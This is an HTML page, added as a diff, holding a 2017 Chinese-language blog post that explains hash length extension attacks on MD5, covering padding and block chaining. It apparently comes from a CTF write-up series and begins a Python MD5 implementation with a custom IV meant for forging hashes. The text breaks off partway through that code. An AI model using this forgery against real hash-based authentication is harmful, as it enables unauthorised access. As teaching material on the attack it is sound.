@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WEB漏洞," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="4ct10n's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste">
+<meta name="keywords" content="WEB漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hash length extension attacks 分析">
+<meta property="og:url" content="http://yoursite.com/2017/07/04/Hash length extension attacks 分析/index.html">
+<meta property="og:site_name" content="4ct10n&#39;s Blog">
+<meta property="og:description" content="0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20170703210658509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170704005525497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170704011612940?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170704012700711?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-10-22T02:14:24.023Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hash length extension attacks 分析">
+<meta name="twitter:description" content="0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170703210658509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/04/Hash length extension attacks 分析/"/>
+
+
+
+
+
+  <title>Hash length extension attacks 分析 | 4ct10n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">4ct10n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/04/Hash length extension attacks 分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="4ct10n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/qq.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="4ct10n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Hash length extension attacks 分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-04T01:27:00+08:00">
+                2017-07-04
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-22T10:14:24+08:00">
+                2017-10-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste<br><a id="more"></a></p>
+<p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p>
+<div class="markdown_views"><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x00-md5加密原理">0x00 MD5加密原理</a><ul><br><li><a href="#0x1-字节填充">0x1 字节填充</a></li><br><li><a href="#0x2-分组加密">0x2 分组加密</a></li><br><li><a href="#0x3-实例演示">0x3 实例演示</a></li><br></ul><br></li><br><li><a href="#0x01-攻击原理">0x01 攻击原理</a></li><br><li><a href="#0x02-攻击脚本">0x02 攻击脚本</a><ul><br><li><a href="#0x1-md5-python-实现">0x1 md5 python 实现</a></li><br><li><a href="#0x2-计算脚本">0x2 计算脚本</a></li><br></ul><br></li><br><li><a href="#0x03-实例演示">0x03 实例演示</a><ul><br><li><a href="#0x1-简单实例">0x1 简单实例</a></li><br><li><a href="#0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</a><ul><br><li><a href="#方法一-利用hashextender">方法一 利用hash_extender</a></li><br><li><a href="#方法二-利用上述脚本">方法二 利用上述脚本</a></li><br></ul><br></li><br><li><a href="#0x3-admin">0x3 admin</a><ul><br><li><a href="#step-1-初步审计">step 1 初步审计</a></li><br><li><a href="#step-2-直接解密解法一">step 2 直接解密解法一</a></li><br><li><a href="#step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击没有必要</a></li><br></ul><br></li><br></ul><br></li><br></ul><br></div><br></div><br></p><br><blockquote><br><p>最近突然想把以前做的哈希拓展长度攻击的原理给梳理一下，前一段时间梳理了 padding  oracle attack的<a href="http://blog.csdn.net/qq_31481187/article/details/71773789" target="_blank" rel="external">相关知识</a>，打算从原理到题目都详细的讲一讲,使用条件比较苛刻需要攻击者明密文都可控，所以在平时这种漏洞很少见，后面主要介绍一下工具的使用方法以及，jarvis平台上的一道题目，以及2017年陕西省信息安全竞赛的最后一道题目admin</p><br></blockquote><br><p>哈希拓展可以伪造任意一对明密文，前提是有一对明密文，且伪造的明文前512比特是固定的···</p><br><h1 id="0x00-md5加密原理">0x00 MD5加密原理</h1><br><p>一些dalao的博客这一点已经说得很清楚了，例如 <a href="http://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="external">Assassin师傅的博文</a></p><br><h2 id="0x1-字节填充">0x1 字节填充</h2><br><p>MD5在进行运算时，需要将bit位数填充到指定位数，使其长度在对 512bit 取模后的值为 448bit，留下的64bit用来填写未填充的明文长度</p><br><h2 id="0x2-分组加密">0x2 分组加密</h2><br><p>把填充过的（注意如果明文大于512bit，将分成多个组进行加密）明文按512bit一组进行下述加密</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170703210658509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>我们可以看到初始向量IV为128bit，每组加密过之后当做下一组的向量进行运算。最后输出的128bit就是md5值</p><br><h2 id="0x3-实例演示">0x3 实例演示</h2><br><p>前面MD5的加密逻辑说得很清楚，这里利用一个实例模拟一下加密过程 </p><br><table><br><thead><br><tr><br><th align="left">加密数据</th><br><th align="right">Value</th><br></tr><br></thead><br><tbody><tr><br><td align="left">十六进制</td><br><td align="right">0x61646d696e</td><br></tr><br><tr><br><td align="left">填充之后</td><br><td align="right">0x61646d696e+0x80+50<em>0x00+0x28+0x00</em>7</td><br></tr><br></tbody></table><br><p>首先字节填充，比特第一位补位1，其余位为0所以为0x80 <br><br>后面全是0字节填充一直到448bit截止，剩下的8byte按照小端方式存储。admin占位5字节所以40bit=0x28bit。 <br><br>这就是基本的MD5加密算法的流程，有没有看懂？？如果看懂了有没有发现攻击者的可乘之机？？<br><br></p><br><h1 id="0x01-攻击原理">0x01 攻击原理</h1><br><p>上篇稍微讲了一下，MD5加密的原理，这里主要讲解攻击方法 <br><br>假设我们已经知道<code>md5($secret+”admin”+”admin”)</code>的值<code>hash1</code> <br><br>其实就是<code>iv  与 $secret+”admin”+”admin”的填充值（这里填充了512bit）的hash值</code> <br><br><strong>现在假设我们有自己的hash算法可以构造任意的初始iv可以填充任意参与计算的明文</strong> <br><br>现在有以下结论 <br><br>如果我要<code>md5（$secret+”admin”+”admin”+第一组MD5填充+padding）</code>这里的第一组md5分组就是<code>md5（$secret+”admin”+”admin”）时的填充之后的512bit块</code> <br><br>那么此值应该在逻辑上等于我利用<code>hash1</code>当做初始向量加密我构造的<code>padding+填充字节（注意这里的填充是算上第一块的长度的即512bit）</code>的第二块生成的md5值<br><br><br><br><br><br></p><br><p>简单的将就是</p><br><pre class="prettyprint"><code class=" hljs bash">md5（<span class="hljs-variable">$secret</span>+”admin”+”admin”+第一组MD5填充+padding）=(<span class="hljs-built_in">hash</span>1)md5(padding+填充字节)</code></pre><br><h1 id="0x02-攻击脚本">0x02 攻击脚本</h1><br><p>这里引用别人写的脚本</p><br><h2 id="0x1-md5-python-实现">0x1 md5 python 实现</h2><br><p>可以自定义iv值</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-comment"># theory reference:</span><br><span class="hljs-comment">#   blog：</span><br><span class="hljs-comment">#       <a href="http://blog.csdn.net/adidala/article/details/28677393" target="_blank" rel="external">http://blog.csdn.net/adidala/article/details/28677393</a></span><br><span class="hljs-comment">#       <a href="http://blog.csdn.net/forgotaboutgirl/article/details/7258109" target="_blank" rel="external">http://blog.csdn.net/forgotaboutgirl/article/details/7258109</a></span><br><span class="hljs-comment">#       <a href="http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</a></span><br><span class="hljs-comment">#   RFC1321：</span><br><span class="hljs-comment">#       <a href="https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf" target="_blank" rel="external">https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</a></span><br><span class="hljs-comment">##############################################################################</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genMsgLengthDescriptor</span><span class="hljs-params">(msg_bitsLenth)</span>:</span><br>    <span class="hljs-string">‘’’<br>    —args:<br>            msg_bitsLenth : the bits length of raw message<br>    –return:<br>            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding<br>    ‘’’</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&gt;Q”</span>,msg_bitsLenth).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_8bytes</span><span class="hljs-params">(hex_str)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str: a hex-encoded string with length 16 , i.e.8bytes<br>    –return:<br>            transform raw message descriptor to little-endian<br>    ‘’’</span><br>    hex_str = <span class="hljs-string">“%016x”</span>%int(hex_str,<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&lt;Q”</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_4bytes</span><span class="hljs-params">(hex_str)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str: a hex-encoded string with length 8 , i.e.4bytes<br>    –return:<br>            transform 4 bytes message block to little-endian<br>    ‘’’</span><br>    hex_str = <span class="hljs-string">“%08x”</span>%int(hex_str,<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&lt;L”</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_rawInputMsg</span><span class="hljs-params">(input_msg)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            input_msg : inputed a ascii-encoded string<br>    –return:<br>            a hex-encoded string which can be inputed to mathematical transformation function.<br>    ‘’’</span><br>    ascii_list = [x.encode(<span class="hljs-string">“hex”</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> input_msg]<br>    length_msg_bytes = len(ascii_list)<br>    length_msg_bits = len(ascii_list)<em><span class="hljs-number">8</span><br>    <span class="hljs-comment">#padding</span><br>    ascii_list.append(<span class="hljs-string">‘80’</span>)<br>    <span class="hljs-keyword">while</span> (len(ascii_list)</em><span class="hljs-number">8</span>+<span class="hljs-number">64</span>)%<span class="hljs-number">512</span> != <span class="hljs-number">0</span>:<br>        ascii_list.append(<span class="hljs-string">‘00’</span>)<br>    <span class="hljs-comment">#add Descriptor</span><br>    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">“”</span>.join(ascii_list)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM16</span><span class="hljs-params">(hex_str,operatingBlockNum)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str : a hex-encoded string with length in integral multiple of 512bits<br>            operatingBlockNum : message block number which is being operated , greater than 1<br>    –return:<br>            M : result of splited 64bytes into 4<em>16 message blocks with little-endian<br><br>    ‘’’</em></span><br>    M = [int(reverse_hex_4bytes(hex_str[i:(i+<span class="hljs-number">8</span>)]),<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">128</span>(operatingBlockNum-<span class="hljs-number">1</span>),<span class="hljs-number">128</span><em>operatingBlockNum,<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">return</span> M<br><br><span class="hljs-comment">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T</span><span class="hljs-params">(i)</span>:</span><br>    result = (int(<span class="hljs-number">4294967296</span></em>abs(<strong>import</strong>(<span class="hljs-string">“math”</span>).sin(i))))&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment">#定义每轮中用到的函数</span><br><span class="hljs-comment">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span><br>F = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;y)|((~x)&amp;z))<br>G = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;z)|(y&amp;(~z)))<br>H = <span class="hljs-keyword">lambda</span> x,y,z:(x^y^z)<br>I = <span class="hljs-keyword">lambda</span> x,y,z:(y^(x|(~z)))<br>RL = L = <span class="hljs-keyword">lambda</span> x,n:(((x&lt;&lt;n)|(x&gt;&gt;(<span class="hljs-number">32</span>-n)))&amp;(<span class="hljs-number">0xffffffff</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FF</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GG</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">HH</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">II</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span><br>    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;<br>    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_md5</span><span class="hljs-params">(A,B,C,D)</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">“”</span>.join( [  <span class="hljs-string">“”</span>.join(<strong>import</strong>(<span class="hljs-string">“re”</span>).findall(<span class="hljs-string">r”..”</span>,<span class="hljs-string">“%08x”</span>%i)[::-<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (A,B,C,D)  ]  )<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_md5</span><span class="hljs-params">(A=<span class="hljs-number">0x67452301</span>,B=<span class="hljs-number">0xefcdab89</span>,C=<span class="hljs-number">0x98badcfe</span>,D=<span class="hljs-number">0x10325476</span>,readyMsg=<span class="hljs-string">“”</span>)</span>:</span><br><br>    a = A<br>    b = B<br>    c = C<br>    d = D<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,len(readyMsg)/<span class="hljs-number">128</span>):<br>        M = getM16(readyMsg,i+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">exec</span> <span class="hljs-string">“M”</span>+str(i)+<span class="hljs-string">“=M[“</span>+str(i)+<span class="hljs-string">“]”</span><br>        <span class="hljs-comment">#First round</span><br>        a=FF(a,b,c,d,M0,<span class="hljs-number">7</span>,<span class="hljs-number">0xd76aa478L</span>)<br>        d=FF(d,a,b,c,M1,<span class="hljs-number">12</span>,<span class="hljs-number">0xe8c7b756L</span>)<br>        c=FF(c,d,a,b,M2,<span class="hljs-number">17</span>,<span class="hljs-number">0x242070dbL</span>)<br>        b=FF(b,c,d,a,M3,<span class="hljs-number">22</span>,<span class="hljs-number">0xc1bdceeeL</span>)<br>        a=FF(a,b,c,d,M4,<span class="hljs-number">7</span>,<span class="hljs-number">0xf57c0fafL</span>)<br>        d=FF(d,a,b,c,M5,<span class="hljs-number">12</span>,<span class="hljs-number">0x4787c62aL</span>)<br>        c=FF(c,d,a,b,M6,<span class="hljs-number">17</span>,<span class="hljs-number">0xa8304613L</span>)<br>        b=FF(b,c,d,a,M7,<span class="hljs-number">22</span>,<span class="hljs-number">0xfd469501L</span>)<br>        a=FF(a,b,c,d,M8,<span class="hljs-number">7</span>,<span class="hljs-number">0x698098d8L</span>)<br>        d=FF(d,a,b,c,M9,<span class="hljs-number">12</span>,<span class="hljs-number">0x8b44f7afL</span>)<br>        c=FF(c,d,a,b,M10,<span class="hljs-number">17</span>,<span class="hljs-number">0xffff5bb1L</span>)<br>        b=FF(b,c,d,a,M11,<span class="hljs-number">22</span>,<span class="hljs-number">0x895cd7beL</span>)<br>        a=FF(a,b,c,d,M12,<span class="hljs-number">7</span>,<span class="hljs-number">0x6b901122L</span>)<br>        d=FF(d,a,b,c,M13,<span class="hljs-number">12</span>,<span class="hljs-number">0xfd987193L</span>)<br>        c=FF(c,d,a,b,M14,<span class="hljs-number">17</span>,<span class="hljs-number">0xa679438eL</span>)<br>        b=FF(b,c,d,a,M15,<span class="hljs-number">22</span>,<span class="hljs-number">0x49b40821L</span>)<br>        <span class="hljs-comment">#Second round</span><br>        a=GG(a,b,c,d,M1,<span class="hljs-number">5</span>,<span class="hljs-number">0xf61e2562L</span>)<br>        d=GG(d,a,b,c,M6,<span class="hljs-number">9</span>,<span class="hljs-number">0xc040b340L</span>)<br>        c=GG(c,d,a,b,M11,<span class="hljs-number">14</span>,<span class="hljs-number">0x265e5a51L</span>)<br>        b=GG(b,c,d,a,M0,<span class="hljs-number">20</span>,<span class="hljs-number">0xe9b6c7aaL</span>)<br>        a=GG(a,b,c,d,M5,<span class="hljs-number">5</span>,<span class="hljs-number">0xd62f105dL</span>)<br>        d=GG(d,a,b,c,M10,<span class="hljs-number">9</span>,<span class="hljs-number">0x02441453L</span>)<br>        c=GG(c,d,a,b,M15,<span class="hljs-number">14</span>,<span class="hljs-number">0xd8a1e681L</span>)<br>        b=GG(b,c,d,a,M4,<span class="hljs-number">20</span>,<span class="hljs-number">0xe7d3fbc8L</span>)<br>        a=GG(a,b,c,d,M9,<span class="hljs-number">5</span>,<span class="hljs-number">0x21e1cde6L</span>)<br>        d=GG(d,a,b,c,M14,<span class="hljs-number">9</span>,<span class="hljs-number">0xc33707d6L</span>)<br>        c=GG(c,d,a,b,M3,<span class="hljs-number">14</span>,<span class="hljs-number">0xf4d50d87L</span>)<br>        b=GG(b,c,d,a,M8,<span class="hljs-number">20</span>,<span class="hljs-number">0x455a14edL</span>)<br>        a=GG(a,b,c,d,M13,<span class="hljs-number">5</span>,<span class="hljs-number">0xa9e3e905L</span>)<br>        d=GG(d,a,b,c,M2,<span class="hljs-number">9</span>,<span class="hljs-number">0xfcefa3f8L</span>)<br>        c=GG(c,d,a,b,M7,<span class="hljs-number">14</span>,<span class="hljs-number">0x676f02d9L</span>)<br>        b=GG(b,c,d,a,M12,<span class="hljs-number">20</span>,<span class="hljs-number">0x8d2a4c8aL</span>)<br>        <span class="hljs-comment">#Third round</span><br>        a=HH(a,b,c,d,M5,<span class="hljs-number">4</span>,<span class="hljs-number">0xfffa3942L</span>)<br>        d=HH(d,a,b,c,M8,<span class="hljs-number">11</span>,<span class="hljs-number">0x8771f681L</span>)<br>        c=HH(c,d,a,b,M11,<span class="hljs-number">16</span>,<span class="hljs-number">0x6d9d6122L</span>)<br>        b=HH(b,c,d,a,M14,<span class="hljs-number">23</span>,<span 